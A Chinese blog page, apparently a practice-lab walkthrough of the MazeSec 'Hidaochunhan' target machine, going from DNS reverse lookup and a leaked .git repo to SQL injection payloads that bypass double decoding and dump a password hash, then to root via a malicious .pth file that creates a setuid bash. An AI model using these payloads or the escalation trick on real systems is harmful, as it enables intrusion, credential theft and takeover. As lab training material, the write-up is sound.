@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>MazeSec Hidaochunhan - the0n3</title>
+        <meta name="description" content="本文复盘了 MazeSec Hidaochunhan靶机的设计流程。设计思路是通过端口扫描发现DNS与Web服务，利用DNS反向查询获取内网域名daochunhan.dsz，访问气象现象观测站。扫描目录发现.git泄露，审计代码定位到搜索功能中先HTML实体编码再URL解码的逻辑缺陷，绕过防护实现SQL注入，导出用户凭证并复用密码登录SSH。登录后审计sudo权限脚本，发现site.addsitedir()加载插件目录时会执行.pth文件，借此写入Python代码完成提权。">
+    <link rel="canonical" href="https://the0n3.top/posts/maze-hidaochunhan/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec Hidaochunhan">
+    <meta property="og:description" content="本文复盘了 MazeSec Hidaochunhan靶机的设计流程。设计思路是通过端口扫描发现DNS与Web服务，利用DNS反向查询获取内网域名daochunhan.dsz，访问气象现象观测站。扫描目录发现.git泄露，审计代码定位到搜索功能中先HTML实体编码再URL解码的逻辑缺陷，绕过防护实现SQL注入，导出用户凭证并复用密码登录SSH。登录后审计sudo权限脚本，发现site.addsitedir()加载插件目录时会执行.pth文件，借此写入Python代码完成提权。">
+    <meta property="og:url" content="https://the0n3.top/posts/maze-hidaochunhan/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-hidaochunhan/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec Hidaochunhan">
+    <meta name="twitter:description" content="本文复盘了 MazeSec Hidaochunhan靶机的设计流程。设计思路是通过端口扫描发现DNS与Web服务，利用DNS反向查询获取内网域名daochunhan.dsz，访问气象现象观测站。扫描目录发现.git泄露，审计代码定位到搜索功能中先HTML实体编码再URL解码的逻辑缺陷，绕过防护实现SQL注入，导出用户凭证并复用密码登录SSH。登录后审计sudo权限脚本，发现site.addsitedir()加载插件目录时会执行.pth文件，借此写入Python代码完成提权。">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-hidaochunhan/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 评论系统预连接：giscus 由前端按访客主题动态注入，提前建连可抵消注入延迟 -->
+    <link rel="preconnect" href="https://giscus.app" crossorigin>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/nav-menu/style.css">
+        <link rel="stylesheet" href="/assets/features/random-recommend/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                <details class="nav-menu">
+                    <summary class="nav-toggle" aria-label="打开菜单"><span aria-hidden="true">☰</span></summary>
+                </details>
+                <div class="nav-links">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                </div>
+                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec Hidaochunhan</h1>
+    <p>
+        <span class="meta">发布于: 2026-11-22 14:47</span>
+                    <span class="meta">· 更新于: 2026-11-23 19:58</span>
+            </p>
+    <div class="post-body">
+        <h2>靶机信息</h2>
+<p>靶机名称：Hidaochunhan<br>
+靶机作者：111<br>
+靶机类型：Linux<br>
+难度: easy<br>
+来源：MazeSec/QQ公开群 321948805<br>
+官网：<a href="https://maze-sec.com/">https://maze-sec.com/</a>  </p>
+<p>闪传下载链接：<a href="https://qfile.qq.com/q/WsvFqQZZC0">https://qfile.qq.com/q/WsvFqQZZC0</a> ，2027-5-17日过期。</p>
+<h2>端口扫描</h2>
+<p>靶机开放了22、53、80端口，53端口是dnsmasq服务，80端口是nginx服务。</p>
+<pre><code class="language-bash">nmap 192.168.6.176 -p- -sT --min-rate 3000
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+53/tcp open  domain
+80/tcp open  http
+
+nmap 192.168.6.176 -p 22,53,80 -sV
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.3 (protocol 2.0)
+53/tcp open  domain  dnsmasq 2.92rel2
+80/tcp open  http    nginx</code></pre>
+<p><img src="/images/maze-hidaochunhan/1.png" alt="端口扫描" decoding="async" width="1279" height="889"></p>
+<h2>web服务测试</h2>
+<p>访问目标 <code>192.168.6.176</code> 的80端口，可以看到nginx的默认页面，目录扫描没有收获。</p>
+<p><img src="/images/maze-hidaochunhan/2.png" alt="目录扫描" decoding="async" loading="lazy" width="1220" height="599"></p>
+<h2>dns反向查询</h2>
+<p>靶机运行了dnsmasq服务，尝试把靶机作为dns服务器，进行反向查询，通过 IP 地址反向查询其对应的主机名或域名，发现有一个域名 <code>daochunhan.dsz</code>，访问该域名，是一个气象现象观测站，网站上有一个查询的功能。</p>
+<pre><code class="language-bash">dig @192.168.6.176 -x 192.168.6.176
+176.6.168.192.in-addr.arpa. 0   IN      PTR     daochunhan.dsz.</code></pre>
+<p><img src="/images/maze-hidaochunhan/3.png" alt="dns反向查询" decoding="async" loading="lazy" width="1150" height="707"></p>
+<p>配置本地的 <code>/etc/hosts</code> 文件，把 <code>daochunhan.dsz</code> 指向靶机的IP地址。</p>
+<pre><code class="language-bash">echo '192.168.6.176 daochunhan.dsz' &gt;&gt; /etc/hosts</code></pre>
+<p><img src="/images/maze-hidaochunhan/4.png" alt="气象现象观测站" decoding="async" loading="lazy" width="1852" height="972"></p>
+<h2>代码审计</h2>
+<p>扫描网站目录，存在 .git 目录泄露问题。</p>
+<p><img src="/images/maze-hidaochunhan/5.png" alt="git泄露" decoding="async" loading="lazy" width="1224" height="750"></p>
+<p>git-dumper 工具可以把 .git 仓库下载下来做代码审计。在 PHP 服务器接收到参数时，会自动做一次 url 解码，这里开发者拿到参数后，先做了一次 html 实体编码，htmlspecialchars 函数把 <code>&lt;</code> <code>&gt;</code> <code>"</code> <code>'</code> 转成 <code>&amp;lt;</code> <code>&amp;gt;</code> <code>&amp;quot;</code> <code>&amp;#039;</code>，避免用户输入内容被浏览器解析成 HTML 标签，防止 XSS 攻击，然后又做一次 url 解码。问题出现在先做了实体编码又进行url解码，导致实体编码失效，攻击者可以通过 url 编码的方式绕过实体编码，再最后一次 url 解码时还原为原始字符如<code>'</code>、<code>"</code>，再拼接进 sql 语句，闭合原始结构，产生 sql 注入漏洞。</p>
+<p><img src="/images/maze-hidaochunhan/6.png" alt="git-dumper" decoding="async" loading="lazy" width="1893" height="732"></p>
+<p>下面是原始sql语句，存在括号包裹。</p>
+<pre><code class="language-sql">$sql = "SELECT id, title, season, summary, occur_month, risk_level FROM dsz_weather WHERE status = 1 AND (title LIKE '%{$kw}%' OR summary LIKE '%{$kw}%') ORDER BY id DESC";</code></pre>
+<p>使用下面这个对 payload 时来分析原语句</p>
+<pre><code class="language-sql">倒春寒%2527) or 1=1%23
+倒春寒%2527) or 1=2%23</code></pre>
+<p>使用第一句 payload，闭合括号后，<code>(title LIKE '%倒春寒')</code>匹配以倒春寒结尾的文章标题，<code>or 1=1</code> 永远为真，AND 优先级高于 OR，where 此时的条件是 <code>where (status =1 AND title like '%倒春寒') or 1=1 #</code>，查询结果返回所有数据，同理当 OR 后面的条件语句为假时，至少返回前面的条件语句匹配的结果。</p>
+<pre><code class="language-sql">$sql = "SELECT id, title, season, summary, occur_month, risk_level FROM dsz_weather WHERE status = 1 AND (title LIKE '%倒春寒') or 1=1 # %' OR summary LIKE '%{$kw}%') ORDER BY id DESC";</code></pre>
+<p>验证结果</p>
+<p><img src="/images/maze-hidaochunhan/7.png" alt="验证结果1" decoding="async" loading="lazy" width="1375" height="685"></p>
+<p><img src="/images/maze-hidaochunhan/8.png" alt="验证结果2" decoding="async" loading="lazy" width="1484" height="669"></p>
+<p>这个搜索框有点奇怪没有搞明白，通过 hackbar 或 url 直接发送都能手测出来，搜索框直接提交没有测试成功。</p>
+<p>如果希望联合注入，需要先闭合括号，前面查询了 6 个字段，联合查询也需要查询 6 个字段，测试发现有 3 个回显位，分别是2、4、5。</p>
+<pre><code class="language-sql">倒春寒%2527) union select 1,2,3,4,5,6%23</code></pre>
+<p><img src="/images/maze-hidaochunhan/9.png" alt="回显位" decoding="async" loading="lazy" width="1317" height="793"></p>
+<p><img src="/images/maze-hidaochunhan/10.png" alt="回显数据库信息" decoding="async" loading="lazy" width="1360" height="785"></p>
+<p>联合查询里套一个子查询，利用 information_schema 数据库查询 dsz 数据库里有什么表，同样的需要注意引号需要二次编码，获取表名 dsz_user、dsz_weather。</p>
+<pre><code class="language-bash"># sql
+SELECT GROUP_CONCAT(table_name) FROM information_schema.tables  WHERE table_schema = 'dsz'
+# payload
+http://daochunhan.dsz/search.php?keyword=倒春寒%2527) union select 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables  WHERE table_schema = %2527dsz%2527),3,version(),database(),6%23</code></pre>
+<p><img src="/images/maze-hidaochunhan/11.png" alt="获取表名" decoding="async" loading="lazy" width="1548" height="815"></p>
+<p>获取表字段名id,name,password_hash,created_at</p>
+<pre><code class="language-bash"># sql
+SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = 'dsz' AND table_name = 'dsz_user'
+# payload
+http://daochunhan.dsz/search.php?keyword=倒春寒%2527) union select 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = %2527dsz%2527 AND table_name = %2527dsz_user%2527),3,version(),database(),6%23</code></pre>
+<p><img src="/images/maze-hidaochunhan/12.png" alt="获取字段名" decoding="async" loading="lazy" width="1867" height="811"></p>
+<p>获取用户表的用户名和密码哈希值1,daochunhan,7363926e777ae17bd2f1a75ef36845bc</p>
+<pre><code class="language-bash"># sql
+SELECT GROUP_CONCAT(CONCAT(id, ',', name, ',', password_hash)) FROM dsz.dsz_user
+# payload
+http://daochunhan.dsz/search.php?keyword=倒春寒%2527) union select 1,(SELECT GROUP_CONCAT(CONCAT(id, %2527,%2527, name, %2527,%2527, password_hash)) FROM dsz.dsz_user),3,version(),database(),6%23</code></pre>
+<p>在线解密密码哈希值，得到密码为 daochunhan2026。该哈希在 somd5 平台可以查询到，在 cmd5 平台可以查到，但是一条付费记录。</p>
+<p><img src="/images/maze-hidaochunhan/13.png" alt="somd5" decoding="async" loading="lazy" width="1869" height="972"></p>
+<p><img src="/images/maze-hidaochunhan/14.png" alt="cmd5" decoding="async" loading="lazy" width="1869" height="962"></p>
+<p>密码复用成功登录 SSH</p>
+<p><img src="/images/maze-hidaochunhan/15.png" alt="SSH登录" decoding="async" loading="lazy" width="1118" height="857"></p>
+<h2>提权</h2>
+<p>daochunhan 用户可以使用 sudo 执行 /opt/weatherbot.py 脚本，审计脚本，使用了 site.addsitedir 函数，加载了配置文件中的插件目录，site.addsitedir 函数会把指定目录加入 sys.path，并且会执行该目录下的 .pth 文件，.pth 文件可以写任意 python 代码，利用这个特性可以提权。详细了解请阅读<a href="https://hacktricks.wiki/zh/linux-hardening/linux-basics/linux-privilege-escalation/index.html#%E5%8F%AF%E5%86%99%E7%9A%84-pth-%E6%96%87%E4%BB%B6%E7%94%B1-siteaddsitedir-%E5%A4%84%E7%90%86">https://hacktricks.wiki/zh/linux-hardening/linux-basics/linux-privilege-escalation/index.html#%E5%8F%AF%E5%86%99%E7%9A%84-pth-%E6%96%87%E4%BB%B6%E7%94%B1-siteaddsitedir-%E5%A4%84%E7%90%86</a></p>
+<p><img src="/images/maze-hidaochunhan/16.png" alt="代码审计" decoding="async" loading="lazy" width="1546" height="931"></p>
+<p>config.json 配置文件中指定了插件目录 <code>/home/daochunhan/preference/plugins</code></p>
+<pre><code class="language-bash">daochunhan@Hidaochunhan:~$ cat preference/config.json
+{
+  "site": "气象现象观测站",
+  "author": "daochunhan",
+  "updated": "2026-11-18",
+  "plugins": "/home/daochunhan/preference/plugins",
+}</code></pre>
+<p>创建插件目录，在该目录下创建一个 a.pth 文件，写入一行以 <code>import</code> 开头，分号分隔的多句python代码，执行 sudo /opt/weatherbot.py 脚本时会执行该代码。</p>
+<pre><code class="language-python">import os;os.system('cp /bin/bash /var/tmp/bash;chmod +s /var/tmp/bash')</code></pre>
+<p><img src="/images/maze-hidaochunhan/17.png" alt="pth提权" decoding="async" loading="lazy" width="1231" height="873"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <a href="/categories/MazeSec/">MazeSec</a>
+                                    <a href="/categories/%E6%88%91%E7%9A%84%E9%9D%B6%E6%9C%BA/">我的靶机</a>
+                            </span>
+                    </div>
+    </article>
+
+<section class="post-recommend markdown-alert markdown-alert-tip" data-featured-recommend dir="auto" hidden aria-labelledby="featuredRecommendTitle">
+    <p class="markdown-alert-title" id="featuredRecommendTitle">
+        <svg class="octicon octicon-light-bulb mr-2" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>推荐阅读
+    </p>
+    <div class="post-recommend__slot" data-featured-recommend-slot></div>
+</section>
+
+
+<section class="post-comments" aria-label="Comments"
+    data-giscus
+    data-theme-mode="auto"
+    data-theme-light="light"
+    data-theme-dark="dark"
+    data-repo="Apursuit/the0n3-blog"
+    data-repo-id="R_kgDORvPPbA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDORvPPbM4C5KAt"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-loading="lazy"
+    data-lang="zh-CN">
+    <div class="giscus"></div>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/blog-stats/script.js"></script>
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/giscus-theme/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
